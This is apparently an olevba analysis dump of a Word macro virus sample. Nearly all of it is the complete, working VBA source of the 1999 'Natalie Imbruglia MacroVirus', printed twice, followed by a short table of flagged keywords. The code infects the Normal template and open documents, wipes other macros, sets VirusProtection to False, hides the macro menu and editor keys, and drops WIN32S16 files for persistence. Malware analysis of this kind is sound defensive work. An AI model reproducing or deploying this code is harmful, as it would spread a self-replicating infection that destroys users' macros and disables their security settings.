olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Daddy-276fd254a2eb7e23aec3c24be64d036f5591530c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Daddy-276fd254a2eb7e23aec3c24be64d036f5591530c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO a.bas 
in file: Virus.MSWord.Daddy-276fd254a2eb7e23aec3c24be64d036f5591530c - OLE stream: 'Macros/VBA/a'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public DokumenAktif As Object, mTujuan As Variant
Public nBackup As Boolean, mAda As Boolean, Musnahkan As Boolean, Reset As Boolean, fKeluar As Boolean, dHitung As Boolean
Function Utama()
On Error Resume Next
   CommandBars("Tools").Controls("Macro").Delete
   CustomizationContext = NormalTemplate
   FindKey(BuildKeyCode(wdF11, wdKeyAlt)).Disable
   FindKey(BuildKeyCode(wdF8, wdKeyAlt)).Disable
On Error GoTo 0
Dim mNama(2) As String
Dim tNorm As Object
Dim mSumber$
On Error GoTo Beres
mNama(0) = "a"
mNama(1) = "a1"
mNama(2) = "a2"
mSumber = MacroContainer
Set tNorm = NormalTemplate
If Not dHitung Then
Set DokumenAktif = ActiveDocument
ElseIf mSumber <> "WIN32S16.DOT" Then
mSumber = tNorm
End If
If mSumber = tNorm Then
mSumber = tNorm.FullName: Set mTujuan = DokumenAktif
ElseIf mSumber = DokumenAktif Then
mSumber = DokumenAktif.FullName: Set mTujuan = tNorm
ElseIf mSumber = "WIN32S16.DOT" Then
Set mTujuan = tNorm
mSumber = Options.DefaultFilePath(8) & "\WIN32S16.DLL"
End If
mMusnahkan mTujuan
With mTujuan.VBProject
If Not (Not Musnahkan And .Description = "a" And .VBComponents.Count > 2) Then
    mGandakan mSumber, mTujuan, mNama
    Musnahkan = False
    .Description = "a"
    If mTujuan = tNorm Then
        Options.SaveInterval = 1
        CustomizationContext = tNorm
        CommandBars("Tools").Reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        mTujuan.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Siaga
End If
End With
If mAda = True Then Exit Function
SiapUlangkan
On Error Resume Next
Siaga:
If fKeluar = True Then Exit Function
Exit Function
Beres:
End Function
Sub mMusnahkan(fSmbr)
On Error Resume Next
Dim mNama As Object
For Each mNama In fSmbr.VBProject.VBComponents
    If mNama.Name = "NewMacros" Then nBackup = True
    If mNama.Name <> "ThisDocument" And mNama.Name <> "NewMacros" _
    And mNama.Name <> "a" And mNama.Name <> "a1" _
    And mNama.Name <> "a2" Then
        Musnahkan = True
        If Reset Then
        Application.OrganizerDelete fSmbr.FullName, mNama.Name, 3
        Else
        mNama.CodeModule.DeleteLines 1, mNama.CodeModule.CountOfLines
        End If
    End If
Next mNama
End Sub
Sub mGandakan(fSmbr, fTjn, mNama)
On Error Resume Next
Dim aNmak
For Each aNmak In mNama
Application.OrganizerCopy fSmbr, fTjn.FullName, aNmak, 3
Next
End Sub
Sub Iklan()
On Error Resume Next
a2.Show
Application.OnTime When:=Now + TimeValue("00:15:00"), Name:="a.Iklan"
End Sub
Sub FileOpen()
On Error Resume Next
wTmp
If Dialogs(80).Show <> 0 Then
wFle
AutoOpen
Else
wFle
End If
End Sub
Sub AutoOpen()
On Error Resume Next
   If Month(Now) = 10 Then GoTo CekTanggal1
   If Month(Now) = 5 Then GoTo CekTanggal2
   GoTo Selesai
CekTanggal1:
   If Day(Now) = 7 Then MsgBox "'Met ulang tahun DaNnY DeSPiRo !", vbInformation, "[ despiro@hotmail.com ]"
   GoTo Selesai
CekTanggal2:
   If Day(Now) = 19 Then MsgBox "'Met ulang tahun YeNi CeLuS !", vbInformation, "[ despiro@hotmail.com ]"
   If Day(Now) = 14 Then MsgBox "Hari jadi DAY.forever !", vbInformation, "[ despiro@hotmail.com ]"
Selesai:
Application.EnableCancelKey = wdCancelDisabled
Utama
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set DokumenAktif = Documents(i)
    dHitung = True
    Musnahkan = False
    Utama
    End If
    Next
End If
If Now > DateSerial(1999, 5, 14) Then Application.OnTime When:=Now + TimeValue("00:15:00"), Name:="a.Iklan"
End Sub
Sub ViewVBCode()
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
fKeluar = True
Utama
wTmp
AddIns.Unload False
wFle
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim mAdd As Object
On Error GoTo Batal
wTmp
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
mAda = True
For Each mAdd In AddIns
    If mAdd.Name = "WIN32S16.DOT" Then mAda = False
Next mAdd
If mAda = True Then
Application.Visible = False
Documents.Add
Utama
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\WIN32S16.DLL", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\WIN32S16.DOT", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
Batal:
wFle
End Sub
Sub ToolsMacro()
On Error Resume Next
   CommandBars("Tools").Controls("Macro").Delete
   CustomizationContext = NormalTemplate
   FindKey(BuildKeyCode(wdF11, wdKeyAlt)).Disable
   FindKey(BuildKeyCode(wdF8, wdKeyAlt)).Disable
On Error GoTo 0
End Sub
Sub FileTemplates()
On Error Resume Next
wFle
If Not Reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
On Error Resume Next
wFle
Dialogs(180).Show
End Sub
Function SiapUlangkan()
On Error Resume Next
Reset = True
FileTemplates
mMusnahkan mTujuan
End Function
Sub AutoClose()
On Error Resume Next
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "a1" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "WIN32S16.DOT" Then Utama
End Sub
Sub FileExit()
On Error Resume Next
AutoExit
End Sub
Sub ToolsOptions()
On Error Resume Next
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function wTmp()
On Error Resume Next
WordBasic.DisableAutoMacros True
End Function
Function wFle()
On Error Resume Next
WordBasic.DisableAutoMacros False
End Function

' Natalie Imbruglia MacroVirus - Release 0.603
'(c)1999, DaNnY DeSPiRo
'         Analisis Kimia - UNPAD
'
' Buat cewek imut yang mirip Natalie Imbruglia kenalan yuuuk ...
' hubungi DaNnY dech di :
'
' e-mail : despiro@hotmail.com
' mail   : P.O. BOX 1704 Bandung 40017 Indonesia
-------------------------------------------------------------------------------
VBA MACRO a1.bas 
in file: Virus.MSWord.Daddy-276fd254a2eb7e23aec3c24be64d036f5591530c - OLE stream: 'Macros/VBA/a1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public DokumenAktif As Object, mTujuan As Variant
Public nBackup As Boolean, mAda As Boolean, Musnahkan As Boolean, Reset As Boolean, fKeluar As Boolean, dHitung As Boolean
Function Utama()
Dim mNama(2) As String
Dim tNorm As Object
Dim mSumber$
On Error GoTo Beres
mNama(0) = "a"
mNama(1) = "a1"
mNama(2) = "a2"
mSumber = MacroContainer
Set tNorm = NormalTemplate
If Not dHitung Then
Set DokumenAktif = ActiveDocument
ElseIf mSumber <> "WIN32S16.DOT" Then
mSumber = tNorm
End If
If mSumber = tNorm Then
mSumber = tNorm.FullName: Set mTujuan = DokumenAktif
ElseIf mSumber = DokumenAktif Then
mSumber = DokumenAktif.FullName: Set mTujuan = tNorm
ElseIf mSumber = "WIN32S16.DOT" Then
Set mTujuan = tNorm
mSumber = Options.DefaultFilePath(8) & "\WIN32S16.DLL"
End If
mMusnahkan mTujuan
With mTujuan.VBProject
If Not (Not Musnahkan And .Description = "a" And .VBComponents.Count > 2) Then
    mGandakan mSumber, mTujuan, mNama
    Musnahkan = False
    .Description = "a"
    If mTujuan = tNorm Then
        Options.SaveInterval = 1
        CustomizationContext = tNorm
        CommandBars("Tools").Reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        mTujuan.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Siaga
End If
End With
If mAda = True Then Exit Function
SiapUlangkan
On Error Resume Next
Siaga:
If fKeluar = True Then Exit Function
Exit Function
Beres:
End Function
Sub mMusnahkan(fSmbr)
On Error Resume Next
Dim mNama As Object
For Each mNama In fSmbr.VBProject.VBComponents
    If mNama.Name = "NewMacros" Then nBackup = True
    If mNama.Name <> "ThisDocument" And mNama.Name <> "NewMacros" _
    And mNama.Name <> "a" And mNama.Name <> "a1" _
    And mNama.Name <> "a2" Then
        Musnahkan = True
        If Reset Then
        Application.OrganizerDelete fSmbr.FullName, mNama.Name, 3
        Else
        mNama.CodeModule.DeleteLines 1, mNama.CodeModule.CountOfLines
        End If
    End If
Next mNama
End Sub
Sub mGandakan(fSmbr, fTjn, mNama)
On Error Resume Next
Dim aNmak
For Each aNmak In mNama
Application.OrganizerCopy fSmbr, fTjn.FullName, aNmak, 3
Next
End Sub
Sub Iklan()
On Error Resume Next
a2.Show
Application.OnTime When:=Now + TimeValue("00:15:00"), Name:="a.Iklan"
End Sub
Sub FileOpen()
On Error Resume Next
wTmp
If Dialogs(80).Show <> 0 Then
wFle
AutoOpen
Else
wFle
End If
End Sub
Sub AutoOpen()
On Error Resume Next
   If Month(Now) = 10 Then GoTo CekTanggal1
   If Month(Now) = 5 Then GoTo CekTanggal2
   GoTo Selesai
CekTanggal1:
   If Day(Now) = 7 Then MsgBox "'Met ulang tahun DaNnY DeSPiRo !", vbInformation, "[ despiro@hotmail.com ]"
   GoTo Selesai
CekTanggal2:
   If Day(Now) = 19 Then MsgBox "'Met ulang tahun YeNi CeLuS !", vbInformation, "[ despiro@hotmail.com ]"
   If Day(Now) = 14 Then MsgBox "Hari jadi DAY.forever !", vbInformation, "[ despiro@hotmail.com ]"
Selesai:
Application.EnableCancelKey = wdCancelDisabled
Utama
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set DokumenAktif = Documents(i)
    dHitung = True
    Musnahkan = False
    Utama
    End If
    Next
End If
If Now > DateSerial(1999, 5, 14) Then Application.OnTime When:=Now + TimeValue("00:15:00"), Name:="a.Iklan"
End Sub
Sub ViewVBCode()
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
fKeluar = True
Utama
wTmp
AddIns.Unload False
wFle
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim mAdd As Object
On Error GoTo Batal
wTmp
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
mAda = True
For Each mAdd In AddIns
    If mAdd.Name = "WIN32S16.DOT" Then mAda = False
Next mAdd
If mAda = True Then
Application.Visible = False
Documents.Add
Utama
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\WIN32S16.DLL", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\WIN32S16.DOT", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
Batal:
wFle
End Sub
Sub ToolsMacro()
On Error Resume Next
   CommandBars("Tools").Controls("Macro").Delete
   CustomizationContext = NormalTemplate
   FindKey(BuildKeyCode(wdF11, wdKeyAlt)).Disable
   FindKey(BuildKeyCode(wdF8, wdKeyAlt)).Disable
On Error GoTo 0
End Sub
Sub FileTemplates()
On Error Resume Next
wFle
If Not Reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
On Error Resume Next
wFle
Dialogs(180).Show
End Sub
Function SiapUlangkan()
On Error Resume Next
Reset = True
FileTemplates
mMusnahkan mTujuan
End Function
Sub AutoClose()
On Error Resume Next
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "a1" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "WIN32S16.DOT" Then Utama
End Sub
Sub FileExit()
On Error Resume Next
AutoExit
End Sub
Sub ToolsOptions()
On Error Resume Next
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function wTmp()
On Error Resume Next
WordBasic.DisableAutoMacros True
End Function
Function wFle()
On Error Resume Next
WordBasic.DisableAutoMacros False
End Function

' Natalie Imbruglia MacroVirus - Release 0.603
'(c)1999, DaNnY DeSPiRo
'         Analisis Kimia - UNPAD
'
' Buat cewek imut yang mirip Natalie Imbruglia kenalan yuuuk ...
' hubungi DaNnY dech di :
'
' e-mail : despiro@hotmail.com
' mail   : P.O. BOX 1704 Bandung 40017 Indonesia
-------------------------------------------------------------------------------
VBA MACRO a2.frm 
in file: Virus.MSWord.Daddy-276fd254a2eb7e23aec3c24be64d036f5591530c - OLE stream: 'Macros/VBA/a2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |WIN32S16.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
